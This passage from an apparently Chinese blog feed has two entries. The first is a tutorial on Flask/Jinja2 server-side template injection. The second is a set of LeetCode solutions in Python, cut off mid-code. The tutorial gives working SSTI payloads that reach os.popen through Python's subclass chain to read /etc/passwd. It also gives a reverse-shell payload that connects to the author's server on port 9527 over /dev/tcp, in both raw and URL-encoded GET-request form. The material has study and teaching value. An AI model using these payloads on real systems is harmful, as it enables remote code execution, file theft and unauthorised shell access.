id="SSTI读取环境变量"><a href="#SSTI读取环境变量" class="headerlink" title="SSTI读取环境变量"></a>SSTI读取环境变量</h4><p>对于Flask的模版渲染而言，如果我们要让服务器执行代码，需要将执行的命令包裹在<code>{ {} }</code>中，对于一个GET请求，包裹在<code>{ {} }</code>中的参数会被后端计算，然后将结果拼接到模版中，完成渲染后返回给用户。</p><h5 id="request-environ"><a href="#request-environ" class="headerlink" title="request.environ"></a>request.environ</h5><p><code>request</code>是Flask框架中的一个全局对象，当我们访问<code>request</code>时可以看到当前的请求</p><p><img src="/2021/11/29/SSTI模版注入/7.png" alt="7"></p><p>在<code>request</code>对象中有一个<code>environ</code>对象名，<code>request.environ</code>是一个与服务器环境相关的对象字典</p><p><img src="/2021/11/29/SSTI模版注入/8.png" alt="8"></p><h5 id="config-items"><a href="#config-items" class="headerlink" title="config.items"></a>config.items</h5><p><code>congfig</code>也是Flask框架中的一个全局对象，其中也包含一些敏感信息</p><p><img src="/2021/11/29/SSTI模版注入/9.png" alt="9"></p><h4 id="SSTI任意文件读写"><a href="#SSTI任意文件读写" class="headerlink" title="SSTI任意文件读写"></a>SSTI任意文件读写</h4><p>对于任意文件读写，我们可以通过python的<code>os</code>模块实现，在Jinja2中是可以直接访问python的一些对象及其方法的，如字符串对象及其upper函数，列表对象及其count函数，字典对象及其has_key函数,那么怎么能够在Jinja2模板中访问到python中的内置变量并且可以调用对应变量类型的方法，这就使用到了python沙盒逃逸。</p><h5 id="python沙箱逃逸"><a href="#python沙箱逃逸" class="headerlink" title="python沙箱逃逸"></a>python沙箱逃逸</h5><p>沙箱逃逸就是在一个严格限制的python环境中，通过绕过限制和过滤达到执行更高权限的过程，这就需要执行一些命令，在python中，可执行命令的模块有如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">os</span><br><span class="line">pty</span><br><span class="line">subprocess</span><br><span class="line">platform</span><br><span class="line">commands</span><br></pre></td></tr></table></figure><h5 id="python魔法函数"><a href="#python魔法函数" class="headerlink" title="python魔法函数"></a>python魔法函数</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__ 返回调用的类型</span><br><span class="line">__mro__ 查看类继承的所有父类，直到object</span><br><span class="line">__subclasses__ 获取类所有的子类</span><br><span class="line">__bases__ 返回所有直接父类组成的元组</span><br><span class="line">__init__ 类实例创建之后调用，对当前对象的实例的一些初始化</span><br><span class="line">__globals__ 能够返回函数所在模块命名空间的所有变量</span><br><span class="line">__getattribute__ 当类被调用的时候，无条件进入此函数</span><br><span class="line">__getattr__ 对象中不存在的属性时调用</span><br></pre></td></tr></table></figure><p>对于获取到os类从而达到命令执行的效果，具体的操作如下</p><h5 id="获取字符串的类对象"><a href="#获取字符串的类对象" class="headerlink" title="获取字符串的类对象"></a>获取字符串的类对象</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">str</span>'&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/10.png" alt="10"></p><h5 id="寻找基类"><a href="#寻找基类" class="headerlink" title="寻找基类"></a>寻找基类</h5><p>这一步的目的是利用继承关系找到object类</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__</span><br><span class="line">(&lt;class 'str'&gt;, &lt;class 'object'&gt;)</span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/11.png" alt="11"></p><h5 id="寻找可引用类"><a href="#寻找可引用类" class="headerlink" title="寻找可引用类"></a>寻找可引用类</h5><p>在object类下查找所有的子类，然后查找到可利用的类</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()</span><br><span class="line">[&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, &lt;class 'weakcallableproxy'&gt;, &lt;class 'weakproxy'&gt;, &lt;class 'int'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes'&gt;, &lt;class 'list'&gt;, &lt;class 'NoneType'&gt;, &lt;class 'NotImplementedType'&gt;, &lt;class 'traceback'&gt;, &lt;class 'super'&gt;, &lt;class 'range'&gt;, &lt;class 'dict'&gt;, &lt;class 'dict_keys'&gt;, &lt;class 'dict_values'&gt;, &lt;class 'dict_items'&gt;, &lt;class 'dict_reversekeyiterator'&gt;, &lt;class 'dict_reversevalueiterator'&gt;, &lt;class 'dict_reverseitemiterator'&gt;, &lt;class 'odict_iterator'&gt;, &lt;class 'set'&gt;, &lt;class 'str'&gt;, &lt;class 'slice'&gt;, &lt;class 'staticmethod'&gt;, &lt;class 'complex'&gt;, &lt;class 'float'&gt;, &lt;class 'frozenset'&gt;, &lt;class 'property'&gt;, &lt;class 'managedbuffer'&gt;, &lt;class 'memoryview'&gt;, &lt;class 'tuple'&gt;, &lt;class 'enumerate'&gt;, &lt;class 'reversed'&gt;, &lt;class 'stderrprinter'&gt;, &lt;class 'code'&gt;, &lt;class 'frame'&gt;, &lt;class 'builtin_function_or_method'&gt;, &lt;class 'method'&gt;, &lt;class 'function'&gt;, &lt;class 'mappingproxy'&gt;, &lt;class 'generator'&gt;, &lt;class 'getset_descriptor'&gt;, &lt;class 'wrapper_descriptor'&gt;, &lt;class 'method-wrapper'&gt;, &lt;class 'ellipsis'&gt;, &lt;class 'member_descriptor'&gt;, &lt;class 'types.SimpleNamespace'&gt;, &lt;class 'PyCapsule'&gt;, &lt;class 'longrange_iterator'&gt;, &lt;class 'cell'&gt;, &lt;class 'instancemethod'&gt;, &lt;class 'classmethod_descriptor'&gt;, &lt;class 'method_descriptor'&gt;, &lt;class 'callable_iterator'&gt;, &lt;class 'iterator'&gt;, &lt;class 'pickle.PickleBuffer'&gt;, &lt;class 'coroutine'&gt;, &lt;class 'coroutine_wrapper'&gt;, &lt;class 'InterpreterID'&gt;, &lt;class 'EncodingMap'&gt;, &lt;class 'fieldnameiterator'&gt;, &lt;class 'formatteriterator'&gt;, &lt;class 'BaseException'&gt;, &lt;class 'hamt'&gt;, &lt;class 'hamt_array_node'&gt;, &lt;class 'hamt_bitmap_node'&gt;, &lt;class 'hamt_collision_node'&gt;, &lt;class 'keys'&gt;, &lt;class 'values'&gt;, &lt;class 'items'&gt;, &lt;class 'Context'&gt;, &lt;class 'ContextVar'&gt;, &lt;class 'Token'&gt;, &lt;class 'Token.MISSING'&gt;, &lt;class 'moduledef'&gt;, &lt;class 'module'&gt;, &lt;class 'filter'&gt;, &lt;class 'map'&gt;, &lt;class 'zip'&gt;, &lt;class '_frozen_importlib._ModuleLock'&gt;, &lt;class '_frozen_importlib._DummyModuleLock'&gt;, &lt;class '_frozen_importlib._ModuleLockManager'&gt;, &lt;class '_frozen_importlib.ModuleSpec'&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class 'classmethod'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib._ImportLockContext'&gt;, &lt;class '_thread._localdummy'&gt;, &lt;class '_thread._local'&gt;, &lt;class '_thread.lock'&gt;, &lt;class '_thread.RLock'&gt;, &lt;class '_io._IOBase'&gt;, &lt;class '_io._BytesIOBuffer'&gt;, &lt;class '_io.IncrementalNewlineDecoder'&gt;, &lt;class 'posix.ScandirIterator'&gt;, &lt;class 'posix.DirEntry'&gt;, &lt;class '_frozen_importlib_external.WindowsRegistryFinder'&gt;, &lt;class '_frozen_importlib_external._LoaderBasics'&gt;, &lt;class '_frozen_importlib_external.FileLoader'&gt;, &lt;class '_frozen_importlib_external._NamespacePath'&gt;, &lt;class '_frozen_importlib_external._NamespaceLoader'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;, &lt;class '_frozen_importlib_external.FileFinder'&gt;, &lt;class 'zipimport.zipimporter'&gt;, &lt;class 'zipimport._ZipImportResourceReader'&gt;, &lt;class 'codecs.Codec'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;class 'codecs.StreamReaderWriter'&gt;, &lt;class 'codecs.StreamRecoder'&gt;, &lt;class '_abc._abc_data'&gt;, &lt;class 'abc.ABC'&gt;, &lt;class 'dict_itemiterator'&gt;, &lt;class 'collections.abc.Hashable'&gt;, &lt;class 'collections.abc.Awaitable'&gt;, &lt;class 'types.GenericAlias'&gt;, &lt;class 'collections.abc.AsyncIterable'&gt;, &lt;class 'async_generator'&gt;, &lt;class 'collections.abc.Iterable'&gt;, &lt;class 'bytes_iterator'&gt;, &lt;class 'bytearray_iterator'&gt;, &lt;class 'dict_keyiterator'&gt;, &lt;class 'dict_valueiterator'&gt;, &lt;class 'list_iterator'&gt;, &lt;class 'list_reverseiterator'&gt;, &lt;class 'range_iterator'&gt;, &lt;class 'set_iterator'&gt;, &lt;class 'str_iterator'&gt;, &lt;class 'tuple_iterator'&gt;, &lt;class 'collections.abc.Sized'&gt;, &lt;class 'collections.abc.Container'&gt;, &lt;class 'collections.abc.Callable'&gt;, &lt;class 'os._wrap_close'&gt;, &lt;class '_sitebuiltins.Quitter'&gt;, &lt;class '_sitebuiltins._Printer'&gt;, &lt;class '_sitebuiltins._Helper'&gt;, &lt;class 'types.DynamicClassAttribute'&gt;, &lt;class 'types._GeneratorWrapper'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class 'itertools.accumulate'&gt;, &lt;class 'itertools.combinations'&gt;, &lt;class 'itertools.combinations_with_replacement'&gt;, &lt;class 'itertools.cycle'&gt;, &lt;class 'itertools.dropwhile'&gt;, &lt;class 'itertools.takewhile'&gt;, &lt;class 'itertools.islice'&gt;, &lt;class 'itertools.starmap'&gt;, &lt;class 'itertools.chain'&gt;, &lt;class 'itertools.compress'&gt;, &lt;class 'itertools.filterfalse'&gt;, &lt;class 'itertools.count'&gt;, &lt;class 'itertools.zip_longest'&gt;, &lt;class 'itertools.permutations'&gt;, &lt;class 'itertools.product'&gt;, &lt;class 'itertools.repeat'&gt;, &lt;class 'itertools.groupby'&gt;, &lt;class 'itertools._grouper'&gt;, &lt;class 'itertools._tee'&gt;, &lt;class 'itertools._tee_dataobject'&gt;, &lt;class 'operator.itemgetter'&gt;, &lt;class 'operator.attrgetter'&gt;, &lt;class 'operator.methodcaller'&gt;, &lt;class 'reprlib.Repr'&gt;, &lt;class 'collections.deque'&gt;, &lt;class '_collections._deque_iterator'&gt;, &lt;class '_collections._deque_reverse_iterator'&gt;, &lt;class '_collections._tuplegetter'&gt;, &lt;class 'collections._Link'&gt;, &lt;class 'functools.partial'&gt;, &lt;class 'functools._lru_cache_wrapper'&gt;, &lt;class 'functools.partialmethod'&gt;, &lt;class 'functools.singledispatchmethod'&gt;, &lt;class 'functools.cached_property'&gt;, &lt;class 'contextlib.ContextDecorator'&gt;, &lt;class 'contextlib._GeneratorContextManagerBase'&gt;, &lt;class 'contextlib._BaseExitStack'&gt;, &lt;class 'enum.auto'&gt;, &lt;enum 'Enum'&gt;, &lt;class 're.Pattern'&gt;, &lt;class 're.Match'&gt;, &lt;class '_sre.SRE_Scanner'&gt;, &lt;class 'sre_parse.State'&gt;, &lt;class 'sre_parse.SubPattern'&gt;, &lt;class 'sre_parse.Tokenizer'&gt;, &lt;class 're.Scanner'&gt;, &lt;class 'typing._Final'&gt;, &lt;class 'typing._Immutable'&gt;, &lt;class 'typing.Generic'&gt;, &lt;class 'typing._TypingEmpty'&gt;, &lt;class 'typing._TypingEllipsis'&gt;, &lt;class 'typing.Annotated'&gt;, &lt;class 'typing.NamedTuple'&gt;, &lt;class 'typing.TypedDict'&gt;, &lt;class 'typing.io'&gt;, &lt;class 'typing.re'&gt;, &lt;class 'importlib.abc.Finder'&gt;, &lt;class 'importlib.abc.Loader'&gt;, &lt;class 'importlib.abc.ResourceReader'&gt;, &lt;class 'rlcompleter.Completer'&gt;]</span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/12.png" alt="12"></p><h5 id="寻找含有os库的类"><a href="#寻找含有os库的类" class="headerlink" title="寻找含有os库的类"></a>寻找含有os库的类</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__mro__[<span class="number">-1</span>].__subclasses__():</span><br><span class="line">count += <span class="number">1</span></span><br><span class="line">  <span class="comment">#在初始化属性中，带wrapper的表示没有重载，因此我们寻找没有带wrapper</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"warpper"</span> <span class="keyword">in</span> repr(i.__init__):</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">      <span class="comment">#__globals__全局方法，查找当前类包含的所有方法和变量及参数</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"os"</span> <span class="keyword">in</span> repr(i.__init__.__globals__):</span><br><span class="line">print(count, i)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>执行结果如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">64</span> &lt;<span class="class"><span class="keyword">class</span> '_<span class="title">frozen_importlib</span>._<span class="title">ModuleLock</span>'&gt;</span></span><br><span class="line"><span class="class">65 &lt;class '_frozen_importlib._DummyModuleLock'&gt;</span></span><br><span class="line"><span class="class">66 &lt;class '_frozen_importlib._ModuleLockManager'&gt;</span></span><br><span class="line"><span class="class">67 &lt;class '_frozen_importlib._installed_safely'&gt;</span></span><br><span class="line"><span class="class">68 &lt;class '_frozen_importlib.ModuleSpec'&gt;</span></span><br><span class="line"><span class="class">79 &lt;class '_frozen_importlib_external.FileLoader'&gt;</span></span><br><span class="line"><span class="class">80 &lt;class '_frozen_importlib_external._NamespacePath'&gt;</span></span><br><span class="line"><span class="class">81 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt;</span></span><br><span class="line"><span class="class">83 &lt;class '_frozen_importlib_external.FileFinder'&gt;</span></span><br><span class="line"><span class="class">117 &lt;class 'os._wrap_close'&gt;</span></span><br><span class="line"><span class="class">147 &lt;class 'reprlib.Repr'&gt;</span></span><br><span class="line"><span class="class">154 &lt;class 'functools.partialmethod'&gt;</span></span><br><span class="line"><span class="class">161 &lt;class 'sre_parse.Pattern'&gt;</span></span><br><span class="line"><span class="class">162 &lt;class 'sre_parse.SubPattern'&gt;</span></span><br><span class="line"><span class="class">163 &lt;class 'sre_parse.Tokenizer'&gt;</span></span><br><span class="line"><span class="class">164 &lt;class 're.Scanner'&gt;</span></span><br></pre></td></tr></table></figure><p>在上述中寻找是否存在文件读取的方法，例如<code>open</code>、<code>popen</code>、<code>file</code>等，最后我们在<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>类中找到了<code>popen</code>函数，从而可以达到任意文件读取的效果。</p><p>payload如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">''.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['popen']('cat /etc/passwd').read()</span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/13.png" alt="13"></p><p>也可以使用Flask框架中的<code>config</code>全局对象来读取任意文件，payload如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()</span><br></pre></td></tr></table></figure><h4 id="SSTI反弹Shell"><a href="#SSTI反弹Shell" class="headerlink" title="SSTI反弹Shell"></a>SSTI反弹Shell</h4><p>因为我们可以调用到os模块，因此可以执行反弹shell，我现在自己的服务器上启动监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elssm@VM-20-13-centos ~&gt; nc -lvvp 9527</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9527</span><br><span class="line">Ncat: Listening on 0.0.0.0:9527</span><br></pre></td></tr></table></figure><p><code>nc</code>命令部分参数介绍</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-h 帮助信息</span><br><span class="line">-i secs 延时的间隔</span><br><span class="line">-l 监听模式，用于入站连接</span><br><span class="line">-L 连接关闭后,仍然继续监听</span><br><span class="line">-n 指定数字的IP地址，不能用hostname</span><br><span class="line">-o file 记录16进制的传输</span><br><span class="line">-p port 本地端口号</span><br><span class="line">-r 随机本地及远程端口</span><br><span class="line">-s addr 本地源地址</span><br><span class="line">-t 使用TELNET交互方式</span><br><span class="line">-u UDP模式</span><br><span class="line">-v 详细输出--用两个-v可得到更详细的内容</span><br><span class="line">-w secs timeout的时间</span><br><span class="line">-z 将输入输出关掉--用于扫描时</span><br></pre></td></tr></table></figure><p>反弹shell的payload如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">''.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['popen']('bash -i &gt;&amp; /dev/tcp/42.193.150.138/9527 0&gt;&amp;1').read()</span><br></pre></td></tr></table></figure><p>但是因为存在<code>&amp;</code>字符，因此在URL解析中会出错，因此我们可以使用Burp构造</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /ssti?code=&#123;&#123;''.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['popen']('bash%20-i%20&gt;%26%20/dev/tcp/42.193.150.138/9527%200&gt;%261').read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/14.png" alt="14"></p><p>成功连接</p><p><img src="/2021/11/29/SSTI模版注入/15.png" alt="15"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h4&gt;&lt;p&gt;SSTI(Server-Side Template Injection)漏洞是模版引擎在使用渲染函数的时候，由于代码不规范而导致的代码注入漏
      
    
    </summary>
    
    
      <category term="Web Security" scheme="elssm.github.io/tags/Web-Security/"/>
    
  </entry>
  
  <entry>
    <title>近期Leetcode题解</title>
    <link href="elssm.github.io/2021/11/24/%E8%BF%91%E6%9C%9FLeetcode%E9%A2%98%E8%A7%A3/"/>
    <id>elssm.github.io/2021/11/24/近期Leetcode题解/</id>
    <published>2021-11-24T04:12:45.000Z</published>
    <updated>2021-12-13T09:54:29.253Z</updated>
    
    <content type="html"><![CDATA[<h4 id="剑指-Offer-43-1～n-整数中-1-出现的次数-hard"><a href="#剑指-Offer-43-1～n-整数中-1-出现的次数-hard" class="headerlink" title="剑指 Offer 43. 1～n 整数中 1 出现的次数(hard)"></a>剑指 Offer 43. 1～n 整数中 1 出现的次数(hard)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">countDigitOne</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        对于305295这个数而言</span></span><br><span class="line"><span class="string">        我们假设从百位开始算，百位前面305计为a,百位后面95计为b，百位数等于n%100，100计为base</span></span><br><span class="line"><span class="string">        当百位数大于1的时候</span></span><br><span class="line"><span class="string">            百位数的前半段可以取值为0～305，一共有a+1个数，后半段可以取0～99，一共有base个数</span></span><br><span class="line"><span class="string">            则百位上1能取到的个数是(a+1)*base个数</span></span><br><span class="line"><span class="string">        对于305195这个数而言</span></span><br><span class="line"><span class="string">        当百位数等于1的时候，分两种情况</span></span><br><span class="line"><span class="string">            1.百位数的前半段可以取值为0～304，一共有a个数，后半段可以取0～99，一共有base个数。</span></span><br><span class="line"><span class="string">            2.百位数的前半段可以取值为305，一共有1个数，后半段可以取0～95，一共有b+1个数。</span></span><br><span class="line"><span class="string">            则百位上1能取到的个数是(a*base+1*(b+1))个数</span></span><br><span class="line"><span class="string">        对于305095这个数而言</span></span><br><span class="line"><span class="string">        当百位数小于1的时候</span></span><br><span class="line"><span class="string">            百位数的前半段可以取值为0～304，一共有a个数，后半段可以取0～99，一共有base个数</span></span><br><span class="line"><span class="string">            则百位上1能取到的个数是(a*base)个数</span></span><br><span class="line"><span class="string">        之后while循环分三种情况统计每一位上1的个数即可</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        base = <span class="number">1</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> base &lt;= n:</span><br><span class="line">            b = n % base</span><br><span class="line">            a = n // base</span><br><span class="line">            cur = a % <span class="number">10</span></span><br><span class="line">            a //= <span class="number">10</span></span><br><span class="line">            <span class="keyword">if</span> cur &gt; <span class="number">1</span>:</span><br><span class="line">                res += (a + <span class="number">1</span>) * base</span><br><span class="line">            <span class="keyword">elif</span> cur == <span class="number">1</span>:</span><br><span class="line">                res += (a * base + b + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res += a * base</span><br><span class="line">            base *= <span class="number">10</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-51-数组中的逆序对-hard"><a href="#剑指-Offer-51-数组中的逆序对-hard" class="headerlink" title="剑指 Offer 51. 数组中的逆序对(hard)"></a>剑指 Offer 51. 数组中的逆序对(hard)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reversePairs</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        通过不断地插入值来寻找前面大于当前值的元素个数</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = <span class="number">0</span> <span class="comment">#统计计数</span></span><br><span class="line">        sorted_nums = [] <span class="comment">#准备一个待插入的列表</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            <span class="comment">#找到nums中当前数在sorted_nums中要插入的下标</span></span><br><span class="line">            k = bisect.bisect(sorted_nums, nums[i]) </span><br><span class="line">            <span class="comment">#当前下标减去要插入的下标就是在大于当前数的个数</span></span><br><span class="line">            res += i - k</span><br><span class="line">            sorted_nums[k:k] = [nums[i]] <span class="comment">#插入当前元素</span></span><br><span class="line">            <span class="comment"># bisect.insort(sorted_nums,nums[i]) #插入当前元素</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-60-n个骰子的点数-medium"><a href="#剑指-Offer-60-n个骰子的点数-medium" class="headerlink" title="剑指 Offer 60. n个骰子的点数(medium)"></a>剑指 Offer 60. n个骰子的点数(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#import numpy as np</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dicesProbability</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: List[float]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#卷积做法</span></span><br><span class="line">        <span class="comment"># conv1 = [1.0/6 for i in range(6)]</span></span><br><span class="line">        <span class="comment"># if n==1:</span></span><br><span class="line">        <span class="comment">#     return conv1</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     convN = self.dicesProbability(n-1)</span></span><br><span class="line">        <span class="comment">#     return np.convolve(convN,conv1)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#动态规划</span></span><br><span class="line">        dp = [<span class="number">1.0</span>/<span class="number">6</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">6</span>)] <span class="comment">#骰子数为1时候的值</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n+<span class="number">1</span>):</span><br><span class="line">            <span class="comment">#tmp长度为n个骰子能取到的值的个数，全部初始化为0</span></span><br><span class="line">            tmp = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(i*<span class="number">5</span>+<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(dp)): <span class="comment">#n-1个骰子取到的所有值</span></span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">6</span>): <span class="comment">#加上第n个骰子取得的值</span></span><br><span class="line">                    tmp[j+k] += dp[j]/<span class="number">6.0</span> <span class="comment">#之前的值和当前的值叠加</span></span><br><span class="line">            dp = tmp <span class="comment">#得到最新的值赋值给dp</span></span><br><span class="line">        <span class="keyword">return</span> dp</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-12-矩阵中的路径-medium"><a href="#剑指-Offer-12-矩阵中的路径-medium" class="headerlink" title="剑指 Offer 12. 矩阵中的路径(medium)"></a>剑指 Offer 12. 矩阵中的路径(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 